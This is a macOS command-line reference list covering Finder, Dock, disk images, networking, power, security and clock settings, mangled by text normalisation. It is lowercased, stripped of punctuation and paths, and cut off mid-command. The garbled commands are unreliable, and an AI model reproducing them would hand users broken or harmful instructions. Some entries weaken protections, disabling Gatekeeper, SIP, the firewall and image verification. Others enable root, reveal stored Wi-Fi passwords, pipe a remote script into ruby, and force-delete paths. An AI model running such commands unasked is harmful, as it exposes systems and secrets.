volume repair file permission source set boot volume show attached disk partition view file system usage apfs convert volume hf apfs create new apfs filesystem create snapshot delete snapshot list snapshot mount snapshot disk image create disk image folder content burn disk image dvd create temporary highperformance disk disable disk image verification make volume o x bootable mount disk image unmount disk image write disk image volume finder desktop show external medium show internal medium show removable medium show network volume file folder clear acls increase number recent place show file extension set protected flag show hidden file show full path finder title toggle folder visibility finder layout show quit finder menu item smooth scrolling rubberband scrolling expand save panel default desktop icon visibility path bar scrollbar visibility status bar save disk default set current folder default search scope set default finder location home folder set sidebar icon size metadata file disable creation metadata file network volume disable creation metadata file usb volume opening thing change working directory finder path open url open file open application open folder open current folder font clear font cache current user get sf mono font function file hardware bluetooth harddisks force trim hardware information list hardware port remaining battery percentage remaining battery time show connected device udid show current screen resolution show cpu brand string infrared receiver power management prevent system sleep show power management setting put display sleep minute inactivity put computer sleep minute inactivity check system sleep idle time set system sleep idle time minute turn system sleep completely automatic restart system freeze chime charging input device keyboard autocorrect full keyboard access key repeat key repeat rate launchpad reset launchpad layout medium audio convert audio file iphone ringtone create audiobook text disable sound effect boot mute audio output set audio volume play audio file speak text system default voice startup chime video autoplay video quicktime player networking bonjour bonjour service dhcp renew dhcp lease show dhcp info dns clear dns cache hostname set computer namehost name network preference network location set static ip address networking tool ping host see whether available troubleshoot routing problem ssh permanently add private key passphrase ssh agent source remote login tcpip show application using certain port show external ip address show network interface information tftp start native tftp daemon wifi join wifi network scan available access point show current ssid show local ip address show wifi connection history show wifi network password turn wifi adapter package manager fink homebrew macports homebrew full uninstall printing clear print queue expand print panel default quit printer app print job complete security application firewall firewall service add application firewall gatekeeper add gatekeeper exception remove gatekeeper exception manage gatekeeper password generate secure password copy clipboard physical access launch screen saver lock screen screensaver immediate lock screensaver password privacy database wiping data apple support page securely remove file securely remove folder securely remove path force search find recursively delete dsstore file locate build locate database search via locate system airdrop airdrop ethernet unsupported mac applescript execute applescript basic compare two folder copy large file progress restore sane shell restart shutdown show build number o uptime clipboard copy data clipboard convert clipboard plain text convert tab space clipboard content copy data clipboard sort strip duplicate line clipboard content filevault automatically unlock filevault restart filevault service informationreports generate advanced system performance report installation create bootable installer download older o version direct download direct download direct download app store app store app store kernel extension display status loaded kernel extension load kernel extension unload kernel extension launchagents file launchservices rebuild launchservices database login window set login window text memory management purge memory cache show memory statistic notification center notification center service quicklook preview via quicklook remote management apple remote desktop prevent double password entry remote apple event root user safe mode boot save dialog screenshots take delayed screenshot save screenshots given location save screenshots given format disable shadow screenshots set default screenshot name software installation install pkg sidecar use incompatible mac software update ignore specific software update install available software update set software update check interval show available software update set software update server apple sus service reposado margarita software version show system software version spotlight spotlight indexing erase spotlight index rebuild search via spotlight show spotlight indexed metadata system integrity protection date time list available timezones set timezone set clock using network time set menu bar clock output format source terminal ring terminal bell alternative terminal alacritty kitty shell bash homepage bashit fish homepage fishshell framework installation configuration tutorial zsh homepage oh zsh prezto zgen terminal font anonymous pro codeface dejavu sans mono fantasque sans mono hack inconsolata input meslo operator mono powerline font source code pro glossary mac o x o x macos version information license creative common attributionsharealike international license,curated list shell command tool specific o x know everything simply need know find necessary john brunner want contribute highly encouraged please read contribution guideline terminal shell goodness please also see list sister list awesome command line apps caffeinating find something helpful could buy coffee spend lot time effort curating list keeping properly caffeinated accelerates thing would really make day kindness stranger ca nt wo nt hard feeling available completely free reason still would awesome http githubcomsponsorsherrbischoff foreword really one thing like note man page man page man page okay three thing one thing seemed important mention multiple time already get habit consulting man page searching anywhere else unixstyle man page excellent source documentation even man page man command also explains number man page refer like man content appearance subpixel antialiasing font smoothing setting present since macos mojave enable default write g cgfontrenderingfontsmoothingdisabled bool false disable default default write g cgfontrenderingfontsmoothingdisabled bool true per application default write comappletextedit cgfontrenderingfontsmoothingdisabled bool false revert application default delete comappletextedit cgfontrenderingfontsmoothingdisabled transparency transparency menu window reduce transparency default write comappleuniversalaccess reducetransparency bool true restore default transparency default write comappleuniversalaccess reducetransparency bool false wallpaper set wallpaper o x mountain lion osascript e tell application finder set desktop picture posix file pathtopicturejpg since o x maverick libraryapplication supportdockdesktoppicturedb update data set value pathtopicturejpg killall dock application app store list apps downloaded app store via find find application path contentsmasreceiptreceipt maxdepth print sed appcontentsmasreceiptreceipt app g application via spotlight mdfind show debug menu work o x yosemite enable default write comappleappstore showdebugmenu bool true disable default default write comappleappstore showdebugmenu bool false apple remote desktop kickstart manual page sudo systemlibrarycoreservicesremotemanagementardagentappcontentsresourceskickstart help activate deactivate ard agent helper activate restart ard agent helper sudo systemlibrarycoreservicesremotemanagementardagentappcontentsresourceskickstart activate restart agent console deactivate stop remote management service sudo systemlibrarycoreservicesremotemanagementardagentappcontentsresourceskickstart deactivate stop remote desktop sharing allow access user give user full access sudo systemlibrarycoreservicesremotemanagementardagentappcontentsresourceskickstart configure allowaccessfor allusers privs disable ard agent remove access privilege user default sudo systemlibrarycoreservicesremotemanagementardagentappcontentsresourceskickstart deactivate configure access remove apple remote desktop setting sudo rm rf vardbremotemanagement sudo default delete librarypreferencescomappleremotedesktopplist default delete librarypreferencescomappleremotedesktopplist sudo rm r libraryapplication supportappleremote desktop rm r libraryapplication supportremote desktop rm r librarycontainerscomappleremotedesktop contact debug mode enable default write comappleaddressbook abshowdebugmenu bool true disable default default write comappleaddressbook abshowdebugmenu bool false google uninstall google update librarygooglegooglesoftwareupdategooglesoftwareupdatebundlecontentsresourcesksinstall nuke itunes keyboard medium key work o x yosemite system integrity protection introduced o x el capitan prevents system launch agent unloaded stop responding key press launchctl unload w systemlibrarylaunchagentscomapplercdplist respond key press default launchctl load w systemlibrarylaunchagentscomapplercdplist o x el capitan either disable sip resort kind hack make itunes inaccessible user effectively preventing starting helper aware intent purpose trash itunes installation may conflict o update road sudo chmod applicationsitunesapp mail show attachment icon default write comapplemail disableinlineattachmentviewing bool yes vacuum mail index applescript code quit mail vacuum sqlite index reopen mail large email database nt optimized provide significant improvement responsiveness speed speed mailapp vacuuming envelope index code http originally pmbuko modification romulo updated brett terpstra updated mathias törnblom support el capitan still keep backwards compatibility updated andrei miclaus support sierra tell application mail quit set osversion shell script swvers productversion set mailversion considering numeric string osversion set mailversion osversion set mailversion osversion set mailversion osversion set mailversion end considering set sizebefore shell script l lnah librarymail mailversion maildata grep e envelope index awk print shell script librarymail mailversion maildataenvelope index vacuum set sizeafter shell script l lnah librarymail mailversion maildata grep e envelope index awk print display dialog mail index sizebefore return mail index sizeafter return return enjoy new speed tell application mail activate safari change default font default write comapplesafari georgia default write comapplesafari default write comapplesafari menlo default write comapplesafari develop menu web inspector enable default write comapplesafari includeinternaldebugmenu bool true default write comapplesafari includedevelopmenu bool true default write comapplesafari webkitdeveloperextrasenabledpreferencekey bool true default write comapplesafari bool true default write g webkitdeveloperextras bool true disable default default delete comapplesafari includeinternaldebugmenu default delete comapplesafari includedevelopmenu default delete comapplesafari webkitdeveloperextrasenabledpreferencekey default delete comapplesafari default delete g webkitdeveloperextras get current page data option get source get text osascript e tell application safari get url current tab front window use backspacedelete go back page enable default write comapplesafari bool yes disable default default write comapplesafari bool sketch export compact svgs default write exportcompactsvg bool yes skim turn auto reload dialog remove dialog default auto reload default write app skim skautoreloadfileupdate boolean true terminal focus follows mouse enable default write comappleterminal focusfollowsmouse string yes disable default default write comappleterminal focusfollowsmouse string textedit use plain text mode default default write comappletextedit richtext int visual studio code vscodevim key repeat enable default write commicrosoftvscode applepressandholdenabled bool false disable default default delete commicrosoftvscode applepressandholdenabled subpixel antialiasing setting present since macos mojave see also systemwide setting subpixel antialiasing enable default write commicrosoftvscode cgfontrenderingfontsmoothingdisabled bool false default write commicrosoftvscodehelper cgfontrenderingfontsmoothingdisabled bool false default write commicrosoftvscodehelpereh cgfontrenderingfontsmoothingdisabled bool false default write commicrosoftvscodehelpernp cgfontrenderingfontsmoothingdisabled bool false disable default default delete commicrosoftvscode cgfontrenderingfontsmoothingdisabled default delete commicrosoftvscodehelper cgfontrenderingfontsmoothingdisabled default delete commicrosoftvscodehelpereh cgfontrenderingfontsmoothingdisabled default delete commicrosoftvscodehelpernp cgfontrenderingfontsmoothingdisabled backup time machine change backup interval change interval minute integer value time second sudo default write systemlibrarylaunchdaemonscomapplebackupdauto startinterval int local backup whether time machine performs local backup time machine backup volume available status default read librarypreferencescomappletimemachine mobilebackups enable default sudo tmutil enablelocal disable sudo tmutil disablelocal since macos high sierra disable local snapshot time machine always creates local apfs snapshot us snapshot data source create regular backup rather using live disk source case hf formatted disk prevent time machine prompting use new hard drive backup volume sudo default write librarypreferencescomappletimemachine donotoffernewdisksforbackup bool true show time machine log little script output last hour time machine activity followed live activity binsh filterprocessimagepath contains backupd subsystem beginswith comappletimemachine show last hour start date j h echo echo history start echo log show style syslog info start start predicate filter echo echo following echo log stream style syslog info predicate filter toggle backup battery status sudo default read librarypreferencescomappletimemachine requiresacpower enable default sudo default write librarypreferencescomappletimemachine requiresacpower bool true disable sudo default write librarypreferencescomappletimemachine requiresacpower bool false verify backup beginning o x time machine record checksum file copied snapshot checksum retroactively computed file copied earlier release o x sudo tmutil verifychecksums pathtobackup developer vim compile sane vim compiling macvim via homebrew bell whistle including overriding system vim brew install macvim head neovim install modern vim dropin alternative via homebrew xcode install command line tool without xcode remove unavailable simulator xcrun simctl delete unavailable dock add stack recent application obsolete since macos mojave see show recent apps default write comappledock persistentothers arrayadd tiledata listtype tiletype recentstile killall dock add nameless stack folder small spacer default write comappledock persistentothers arrayadd tiledata tiletype smallspacertile killall dock add space default write comappledock persistentapps arrayadd tiletype spacertile killall dock add small space default write comappledock persistentapps arrayadd tiletype smallspacertile killall dock auto rearrange space based recent use enable default default write comappledock mruspaces bool true killall dock disable default write comappledock mruspaces bool false killall dock automatically hide enable default write comappledock autohide bool true killall dock disable default default write comappledock autohide bool false killall dock icon bounce global setting whether dock icon bounce respective application demand attention enable default default write comappledock nobouncing bool true killall dock disable default write comappledock nobouncing bool false killall dock lock dock size enable default write comappledock sizeimmutable bool yes killall dock disable default default write comappledock sizeimmutable bool killall dock reset dock default delete comappledock killall dock resize fully resize dock body resize change value integer default write comappledock tilesize int killall dock scroll gesture use touchpad mouse scroll wheel interact dock item allows use upward scrolling gesture open stack using gesture application running invokes exposémission control enable default write comappledock scrolltoopen bool true killall dock disable default default write comappledock scrolltoopen bool false killall dock set auto showhide delay float number defines showhide delay m default write comappledock autohidetimemodifier float default write comappledock autohidedelay float killall dock show hidden app icon enable default write comappledock showhidden bool true killall dock disable default default write comappledock showhidden bool false killall dock show active application enable default write comappledock staticonly bool true killall dock disable default default write comappledock staticonly bool false killall dock show recent apps setting present since macos mojave disable default write comappledock showrecents bool false killall dock enable default default write comappledock showrecents bool true killall dock single app mode clicking application icon dock respective window come front application window hidden enable default write comappledock singleapp bool true killall dock disable default default write comappledock singleapp bool false killall dock document convert file html supported format plain text rich text rtf microsoft word docdocx textutil convert html fileext file disk volume create empty file creates empty gigabyte test file disable sudden motion sensor leaving turned useless using ssds eject mountable volume reliable way sending applescript command finder osascript e tell application finder eject every disk whose ejectable true repair file permission nt use disk utility gui sudo diskutil repairpermissions beginning o x el capitan system file permission automatically protected longer necessary verify repair permission disk utility source set boot volume o x yosemite bless mount pathtomountedvolume setboot o x el capitan sudo systemsetup setstartupdisk systemlibrarycoreservices show attached disk partition view file system usage continuous stream file system access info apfs present since macos high sierra central utility usage inconsistent functionality rolled tmutil convert volume hf apfs systemlibraryfilesystemsapfsfscontentsresourceshfsconvert pathtofilesystem create new apfs filesystem systemlibraryfilesystemsapfsfscontentsresourcesnewfsapfs pathtodevice create snapshot delete snapshot tmutil deletelocalsnapshots list snapshot tmutil listlocalsnapshots mount snapshot snapshot readonly mkdir mnt systemlibraryfilesystemsapfsfscontentsresourcesmountapfs mnt disk image create disk image folder content hdiutil create volname volume name srcfolder pathtofolder ov diskimagedmg like encrypt disk image hdiutil create encryption stdinpass volname volume name srcfolder pathtofolder ov encrypteddmg default prompted password automate piping password echo n yourpassword hdiutil create encryption stdinpass volname volume name srcfolder pathtofolder ov encrypteddmg burn disk image dvd command applies iso img dmg image hdiutil burn pathtoimagefile create temporary highperformance disk disk backed physical ram several time faster ssd content disk recovered ejected example mib ram disk adjust needed macos mojave let diskutil erasevolume hf ram disk hdiutil attach nomount ram disksize macos catalina let disksize diskutil erasevolume hf ram disk hdiutil attach nomount ram disksize disable disk image verification default write comappleframeworksdiskimages skipverify bool true default write comappleframeworksdiskimages skipverifylocked bool true default write comappleframeworksdiskimages skipverifyremote bool true make volume o x bootable bless folder pathtomountedvolumesystemlibrarycoreservices bootinfo bootefi mount disk image hdiutil attach pathtodiskimagedmg unmount disk image hdiutil detach write disk image volume like disk utility restore function sudo asr restore noverify source pathtodiskimagedmg target volumesvolumetorestoreto finder desktop show external medium external hds thumb drive etc enable default write comapplefinder showexternalharddrivesondesktop bool true killall finder disable default default write comapplefinder showexternalharddrivesondesktop bool false killall finder show internal medium builtin hds ssds enable default write comapplefinder showharddrivesondesktop bool true killall finder disable default default write comapplefinder showharddrivesondesktop bool false killall finder show removable medium cd dvd ipod etc enable default write comapplefinder showremovablemediaondesktop bool true killall finder disable default default write comapplefinder showremovablemediaondesktop bool false killall finder show network volume afp smb nfs webdav etc enable default write comapplefinder showmountedserversondesktop bool true killall finder disable default default write comapplefinder showmountedserversondesktop bool false killall finder file folder clear acls sudo chmod rn pathtofolder increase number recent place default write g nsnavrecentplaceslimit int killall finder show file extension default write g appleshowallextensions bool true set protected flag equivalent finder locked status disable default sudo chflags r nouchg pathtofileorfolder enable sudo chflags r uchg pathtofileorfolder show hidden file show default write comapplefinder appleshowallfiles true restore default file visibility default write comapplefinder appleshowallfiles false show full path finder title default write comapplefinder fxshowposixpathintitle bool true toggle folder visibility finder default library folder hidden easily show method work folder hidden default chflags hidden library visible chflags nohidden library layout show quit finder menu item make possible see finder menu item quit finder default shortcut cmd q enable default write comapplefinder quitmenuitem bool true killall finder disable default default write comapplefinder quitmenuitem bool false killall finder smooth scrolling useful older mac mess animation disable default write g nsscrollanimationenabled bool false enable default default write g nsscrollanimationenabled bool true rubberband scrolling disable default write g nsscrollviewrubberbanding bool false enable default default write g nsscrollviewrubberbanding bool true expand save panel default default write g nsnavpanelexpandedstateforsavemode bool true default write g bool true desktop icon visibility hide icon default write comapplefinder createdesktop bool false killall finder show icon default default write comapplefinder createdesktop bool true killall finder path bar show default write comapplefinder showpathbar bool true hide default default write comapplefinder showpathbar bool false scrollbar visibility possible value whenscrolling automatic always default write g appleshowscrollbars string always status bar show default write comapplefinder showstatusbar bool true hide default default write comapplefinder showstatusbar bool false save disk default set default save target local disk icloud default write g nsdocumentsavenewdocumentstocloud bool false set current folder default search scope default write comapplefinder fxdefaultsearchscope string sccf set default finder location home folder default write comapplefinder newwindowtarget string pflo default write comapplefinder newwindowtargetpath string file home set sidebar icon size set size medium default write g nstableviewdefaultsizemode int metadata file disable creation metadata file network volume avoids creation dsstore appledouble file default write comappledesktopservices dsdontwritenetworkstores bool true disable creation metadata file usb volume avoids creation dsstore appledouble file default write comappledesktopservices dsdontwriteusbstores bool true opening thing change working directory finder path multiple window open chooses topmost one cd osascript e tell app finder posix path insertion location alias open url open file open application open application using open google chrome http githubcom open folder open current folder font clear font cache current user clear font cache user put sudo front command atsutil database removeuser atsutil server shutdown atsutil server ping get sf mono font starting macos catalina utility apps including terminalapp found system folder cp v applicationsxcodebetaappcontentssharedframeworksdvtkitframeworkversionsaresourcesfontssfmono libraryfonts macos sierra included terminalapp cp v applicationsutilitiesterminalappcontentsresourcesfontssfmono libraryfonts older o version need download install xcode beta work afterwards available application cp v systemapplicationsutilitiesterminalappcontentsresourcesfontssfmono libraryfonts function please see file hardware bluetooth o x sierra bluetooth daemon named blued instead bluetoothd need adjust killall command accordingly status default read librarypreferencescomapplebluetooth controllerpowerstate enable default sudo default write librarypreferencescomapplebluetooth controllerpowerstate int disable sudo default write librarypreferencescomapplebluetooth controllerpowerstate int sudo killall hup bluetoothd harddisks force trim enable trim nonapple ssds command present since o x yosemite hardware information list hardware port networksetup listallhardwareports remaining battery percentage pmset g batt egrep colourauto cut remaining battery time pmset g batt egrep colourauto cut show connected device udid systemprofiler spusbdatatype sed n e ipad serialp e iphone serialp show current screen resolution systemprofiler spdisplaysdatatype grep resolution show cpu brand string sysctl n machdepcpubrandstring infrared receiver status default read librarypreferencescomappledriverappleircontroller deviceenabled enable default default write librarypreferencescomappledriverappleircontroller deviceenabled int disable default write librarypreferencescomappledriverappleircontroller deviceenabled int power management prevent system sleep prevent sleep hour show power management setting put display sleep minute inactivity sudo pmset displaysleep put computer sleep minute inactivity check system sleep idle time sudo systemsetup getcomputersleep set system sleep idle time minute sudo systemsetup setcomputersleep turn system sleep completely sudo systemsetup setcomputersleep never automatic restart system freeze sudo systemsetup setrestartfreeze chime charging play io charging sound magsafe connected enable default write comapplepowerchime chimeonallhardware bool true open systemlibrarycoreservicespowerchimeapp disable default default write comapplepowerchime chimeonallhardware bool false killall powerchime input device keyboard autocorrect disable default write g nsautomaticspellingcorrectionenabled bool false enable default default write g nsautomaticspellingcorrectionenabled bool true show status default read g nsautomaticspellingcorrectionenabled full keyboard access enable tab modal dialog text box list default default write nsglobaldomain applekeyboarduimode int control default write nsglobaldomain applekeyboarduimode int key repeat change press hold behavior enable default write g applepressandholdenabled bool false disable default default write g applepressandholdenabled bool true key repeat rate set fast repeat rate adjust taste default write g keyrepeat int launchpad reset launchpad layout need restart dock launchpad tied o x yosemite rm libraryapplication supportdock db killall dock o x el capitan default write comappledock resetlaunchpad bool true killall dock medium audio convert audio file iphone ringtone afconvert f create audiobook text us alex voice plain encoded text file input aac output say v alex f filetxt disable sound effect boot sudo nvram systemaudiovolume mute audio output osascript e set volume output muted true set audio volume osascript e set volume play audio file play audio format natively supported quicktime speak text system default voice say base belong u startup chime older mac enable default sudo nvram bootaudio disable sudo nvram bootaudio model enable sudo nvram startupmute disable default sudo nvram startupmute video autoplay video quicktime player default write comapplequicktimeplayerx mgplaymovieonopen networking bonjour bonjour service disable sudo default write systemlibrarylaunchdaemonscomapplemdnsresponderplist programarguments arrayadd nomulticastadvertisements enable default sudo default write systemlibrarylaunchdaemonscomapplemdnsresponderplist programarguments array usrsbinmdnsresponder launchd dhcp renew dhcp lease sudo ipconfig set dhcp show dhcp info dns clear dns cache sudo dscacheutil flushcache sudo killall hup mdnsresponder hostname set computer namehost name sudo scutil set computername newhostname sudo scutil set hostname newhostname sudo scutil set localhostname newhostname sudo default write librarypreferencessystemconfigurationcomapplesmbserver netbiosname string newhostname network preference network location switch network location created network preference pane status scselect switch network location scselect locationnamefromstatus set static ip address networksetup setmanual ethernet networking tool ping host see whether available troubleshoot routing problem ssh permanently add private key passphrase ssh agent prior macos sierra ssh would present dialog asking passphrase would offer option store keychain ui deprecated time ago removed instead new usekeychain option introduced macos sierra allowing user specify whether would like passphrase stored keychain option enabled default macos sierra caused passphrases stored keychain intended default behavior changed macos source sshadd k pathtoprivatekey add sshconfig host serverexamplecom identityfile pathtoprivatekey usekeychain yes remote login enable sudo launchctl load w systemlibrarylaunchdaemonssshplist disable default sudo launchctl unload w systemlibrarylaunchdaemonssshplist tcpip show application using certain port output application currently using port show external ip address work isp nt replace dns request nt dig short myipopendnscom alternative work network curl http apiipifyorg echo show network interface information undocumented flag scutil command tftp start native tftp daemon file served privatetftpboot sudo launchctl load f systemlibrarylaunchdaemonstftpplist sudo launchctl start comappletftpd wifi join wifi network networksetup setairportnetwork wifissid wifipassword scan available access point create symbolic link airport command easy access sudo ln usrlocalbinairport run wireless scan show current ssid awk ssid print substr index show local ip address show wifi connection history default read librarypreferencessystemconfigurationcomappleairportpreferences grep lastconnected show wifi network password exchange ssid ssid access point wish query password security findgenericpassword airport network password ssid gw turn wifi adapter networksetup setairportpower package manager fink full world unix open source software darwin little outdated homebrew missing package manager o x popular choice macports compile install upgrade either commandline aqua based opensource software homebrew full uninstall ruby e curl fssl http rawgithubusercontentcomhomebrewinstallmasteruninstall printing clear print queue expand print panel default default write g pmprintingexpandedstateforprint bool true default write g bool true quit printer app print job complete default write comappleprintprintingprefs quit finished bool true security application firewall firewall service show status sudo usrlibexecapplicationfirewallsocketfilterfw getglobalstate enable sudo usrlibexecapplicationfirewallsocketfilterfw setglobalstate disable default sudo usrlibexecapplicationfirewallsocketfilterfw setglobalstate add application firewall sudo usrlibexecapplicationfirewallsocketfilterfw add pathtofile gatekeeper add gatekeeper exception spctl add pathtoapplicationapp remove gatekeeper exception spctl remove pathtoapplicationapp manage gatekeeper especially helpful annoying macos catalina system popup blocking execution nonsigned apps status spctl status enable default sudo spctl masterenable disable sudo spctl masterdisable password generate secure password copy clipboard lcallc tr dc alnum devurandom head c pbcopy physical access launch screen saver macos sierra open systemlibraryframeworksscreensaverframeworkversionsaresourcesscreensaverengineapp macos high sierra systemlibrarycoreservicesscreensaverengineappcontentsmacosscreensaverengine lock screen systemlibrarycoreservicesmenu extrasusermenucontentsresourcescgsession suspend screensaver immediate lock status default read comapplescreensaver askforpassworddelay enable default default write comapplescreensaver askforpassworddelay int disable integer lock delay second default write comapplescreensaver askforpassworddelay int screensaver password status default read comapplescreensaver askforpassword enable default write comapplescreensaver askforpassword int disable default default write comapplescreensaver askforpassword int privacy database tccutil command manages privacy database store decision user made whether apps may access personal data need close application except terminal running command full reset application sudo tccutil reset reset adress book access sudo tccutil reset addressbook reset permission terminalapp sudo tccutil reset comappleterminal wiping data note srm command appears removed macos note apple support page hinting ssd drive secure erase erasing free space available disk utility option needed ssd drive standard erase make difficult recover data ssd securely remove file securely remove folder securely remove path force srm rf pathtocompletedestruction search find recursively delete dsstore file find type f name dsstore l delete locate build locate database sudo launchctl load w systemlibrarylaunchdaemonscomapplelocateplist search via locate modifier make search case insensitive system airdrop airdrop ethernet unsupported mac enable default write comapplenetworkbrowser browseallinterfaces bool true default remove comapplenetworkbrowser disableairdrop disable default default delete comapplenetworkbrowser browseallinterfaces default write comapplenetworkbrowser disableairdrop bool yes applescript execute applescript osascript pathtoscriptscpt basic compare two folder diff qr copy large file progress make sure pv installed replace appropriate write device file filepathtofileiso pv du h file awk print file sudo dd restore sane shell case shell session went insane script application turned garbled mess restart shutdown show build number o uptime long since last restart clipboard copy data clipboard cat whatevertxt pbcopy convert clipboard plain text pbpaste textutil convert txt stdin stdout encoding pbcopy convert tab space clipboard content pbpaste expand pbcopy copy data clipboard sort strip duplicate line clipboard content pbpaste sort uniq pbcopy filevault automatically unlock filevault restart filevault enabled current volume restarts system bypassing initial unlock command may work system sudo fdesetup authrestart filevault service status sudo fdesetup status enable sudo fdesetup enable disable default sudo fdesetup disable informationreports generate advanced system performance report sudo sysdiagnose f desktop installation create bootable installer macos catalina sudo applicationsinstall macos catalinaappcontentsresourcescreateinstallmedia volume volumesusb nointeraction downloadassets macos mojave sudo applicationsinstall macos mojaveappcontentsresourcescreateinstallmedia volume volumesusb nointeraction downloadassets macos high sierra sudo applicationsinstall macos high sierraappcontentsresourcescreateinstallmedia volume volumesusb applicationpath applicationsinstall macos high sierraapp macos sierra sudo applicationsinstall macos sierraappcontentsresourcescreateinstallmedia volume volumesusb applicationpath applicationsinstall macos sierraapp o x el capitan sudo applicationsinstall o x el capitanappcontentsresourcescreateinstallmedia volume volumesusb applicationpath applicationsinstall o x el capitanapp o x yosemite sudo applicationsinstall o x yosemiteappcontentsresourcescreateinstallmedia volume volumesusb applicationpath applicationsinstall o x yosemiteapp confirmation erasing drive remove command optional flag new macos mojave downloads asset may required installation like update flag deprecated since macos mojave throw error used download older o version version codename download mac o x cheetah na mac o x puma na mac o x jaguar na mac o x panther na mac o x tiger na mac o x leopard na mac o x snow leopard na mac o x lion na o x mountain lion na o x maverick na o x yosemite direct download o x el capitan direct download macos sierra direct download macos high sierra app store macos mojave app store macos catalina app store kernel extension display status loaded kernel extension load kernel extension sudo kextload b comappledriverexamplebundle unload kernel extension sudo kextunload b comappledriverexamplebundle launchagents please see file launchservices rebuild launchservices database independent o x version relies locate find lsregister locate database built yet sudo locate lsregister kill seed r login window set login window text sudo default write librarypreferencescomappleloginwindow loginwindowtext text memory management purge memory cache show memory statistic one time vmstat table data repeat time total second wait poll vmstat c notification center notification center service disable launchctl unload w systemlibrarylaunchagentscomapplenotificationcenteruiplist killall notificationcenter enable default launchctl load w systemlibrarylaunchagentscomapplenotificationcenteruiplist quicklook preview via quicklook qlmanage p pathtofile remote management see also apple remote desktop prevent double password entry logging mac remotely via apple remote desktop vnc sometimes required enter password second time connecting mac disable behavior explicitly recommend turn functionality unless certain one else able access mac physically away disable sudo default write librarypreferencescomappleremotemanagementplist restoremachinestate bool enable default sudo default write librarypreferencescomappleremotemanagementplist restoremachinestate bool yes remote apple event status sudo systemsetup getremoteappleevents enable sudo systemsetup setremoteappleevents disable default sudo systemsetup setremoteappleevents root user enable dsenableroot disable default dsenableroot safe mode boot status nvram bootargs enable sudo nvram bootargs x disable default sudo nvram bootargs save dialog significantly improve rather slow animation save dialog default write nsglobaldomain nswindowresizetime screenshots take delayed screenshot take screenshot jpeg second display preview screencapture jpg p delayedpicjpg save screenshots given location set location desktop default write comapplescreencapture location desktop killall systemuiserver save screenshots given format set format png option bmp gif jpg jpeg pdf tiff default write comapplescreencapture type string png disable shadow screenshots default write comapplescreencapture disableshadow bool true killall systemuiserver set default screenshot name date time remain unchanged default write comapplescreencapture name example name killall systemuiserver software installation install pkg installer pkg pathtoinstallerpkg target sidecar use incompatible mac may may work depending age machine enable default write comapplesidecardisplay allowalldevices bool true default write comapplesidecardisplay hasshownpref bool true disable default default delete comapplesidecardisplay software update ignore specific software update identifier found via softwareupdate list example macos mojave ignore update prompt macos catalina since latter remove support sudo usrsbinsoftwareupdate ignore macos catalina install available software update set software update check interval set check daily instead weekly default write comapplesoftwareupdate schedulefrequency int show available software update sudo softwareupdate list set software update server done testing purpose unmanaged client use networkwide either correctly set dns along apple sus service bind client via opendirectory alternatively use reposado together correct network dns setting make resolution transparent margarita look nice well use sus sudo default write librarypreferencescomapplesoftwareupdate catalogurl http reset apple sus sudo default delete librarypreferencescomapplesoftwareupdate catalogurl software version show system software version several way obtain different level detail systemprofiler spsoftwaredatatype default read loginwindow systemversionstampasstring spotlight spotlight indexing disable mdutil pathtovolume enable default mdutil pathtovolume erase spotlight index rebuild mdutil e pathtovolume search via spotlight mdfind name searchterm show spotlight indexed metadata system integrity protection reboot holding cmd r open terminal application need reboot command take effect status csrutil status enable default csrutil enable disable csrutil disable date time list available timezones sudo systemsetup listtimezones set timezone sudo systemsetup settimezone europeberlin set clock using network time status sudo systemsetup getusingnetworktime enable default sudo systemsetup setusingnetworktime disable sudo systemsetup setusingnetworktime set menu bar clock output format system preference date time time option analogue sudo default write comapplemenuextraclock isanalog bool true digital default sudo default write comapplemenuextraclock isanalog bool false system preference date time flash time separator enable sudo default write comapplemenuextraclock flashdateseparators bool true disable default sudo default write comapplemenuextraclock flashdateseparators bool false thu aug system preference date time display time second checked s system preference date time use clock checked hh mm system preference date time show ampm unchecked system preference date time show day week checked eee system preference date time show date checked mmm sudo default write comapplemenuextraclock dateformat string eee mmm hh mm s thu system preference date time display time second checked s system preference date time use clock checked hh mm system preference date time show ampm unchecked system preference date time show day week checked eee system preference date time show date unchecked sudo default write comapplemenuextraclock dateformat string eee hh mm s aug system preference date time display time second checked s system preference date time use clock checked hh mm system preference date time show ampm unchecked system preference date time show day week unchecked system preference date time show date checked mmm sudo default write comapplemenuextraclock dateformat string mmm hh mm s system preference date time display time second checked s system preference date time use clock checked hh mm system preference date time show ampm unchecked system preference date time show day week unchecked system preference date time show date unchecked sudo default write comapplemenuextraclock dateformat string hh mm s thu aug pm system preference date time display time second checked s system preference date time use clock unchecked system preference date time show ampm checked system preference date time show day week checked eee system preference date time show date checked mmm sudo default write comapplemenuextraclock dateformat string eee mmm h mm s thu pm system preference date time display time second checked s system preference date time use clock unchecked system preference date time show ampm checked system preference date time show day week checked eee system preference date time show date unchecked sudo default write comapplemenuextraclock dateformat string eee h mm s aug pm system preference date time display time second checked s system preference date time use clock unchecked system preference date time show ampm checked system preference date time show day week unchecked system preference date time show date checked mmm sudo default write comapplemenuextraclock dateformat string mmm h mm s pm system preference date time display time second checked s system preference date time use clock unchecked system preference date time show ampm checked system preference date time show day week unchecked system preference date time show date unchecked sudo default write comapplemenuextraclock dateformat string h mm s thu aug system preference date time display time second checked s system preference date time use clock unchecked system preference date time show ampm unchecked system preference date time show day week checked eee system preference date time show date checked mmm sudo default write comapplemenuextraclock dateformat string eee mmm h mm s thu system preference date time display time second checked s system preference date time use clock unchecked system preference date time show ampm unchecked system preference date time show day week checked eee system preference date time show date unchecked sudo default write comapplemenuextraclock dateformat string eee h mm s aug system preference date time display time second checked s system preference date time use clock unchecked system preference date time show ampm unchecked system preference date time show day week unchecked system preference date time show date checked mmm sudo default write comapplemenuextraclock dateformat string mmm h mm s system preference date time display time second checked s system preference date time use clock unchecked system preference date time show ampm unchecked system preference date time show day week unchecked system preference date time show date unchecked sudo default write comapplemenuextraclock dateformat string h mm s thu aug system preference date time display time second unchecked system preference date time use clock checked hh mm system preference date time show ampm unchecked system preference date time show day week checked eee system preference date time show date checked mmm sudo default write comapplemenuextraclock dateformat string eee mmm hh mm thu system preference date time display time second unchecked system preference date time use clock checked hh mm system preference date time show ampm unchecked system preference date time show day week checked eee system preference date time show date unchecked sudo default write comapplemenuextraclock dateformat string eee hh mm aug system preference date time display time second unchecked system preference date time use clock checked hh mm system preference date time show ampm unchecked system preference date time show day week unchecked system preference date time show date checked mmm sudo default write comapplemenuextraclock dateformat string mmm hh mm system preference date time display time second unchecked system preference date time use clock checked hh mm system preference date time show ampm unchecked system preference date time show day week unchecked system preference date time show date unchecked sudo default write 